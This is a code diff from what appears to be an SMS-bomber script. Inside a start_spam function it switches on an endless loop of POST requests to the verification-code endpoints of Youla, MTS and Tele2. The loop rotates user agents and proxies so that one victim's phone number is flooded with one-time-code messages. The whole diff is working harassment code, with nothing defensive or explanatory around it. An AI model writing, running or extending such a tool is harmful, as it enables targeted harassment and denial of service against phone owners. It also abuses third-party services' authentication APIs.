@@ -87,20 +87,16 @@ def start_spam(phone, proxies):
     headers = {"User-Agent": generate_user_agent()}
     while True:
     
-#        try:
-#            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, proxies=proxies)
-#        except:
-#            pass
-#        try:
-#            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=headers, proxies=proxies)
-#        except:
-#           pass
-#        try:
- #           post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers, proxies=proxies)
-#        except:
-#            pass
         try:
-           post(f"https://lk.mts.ru/", data={"value": phone}, headers=headers, proxies=proxies)
+            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, proxies=proxies)
+        except:
+            pass
+        try:
+            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=headers, proxies=proxies)
+        except:
+           pass
+        try:
+           post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers, proxies=proxies)
         except:
             pass
             
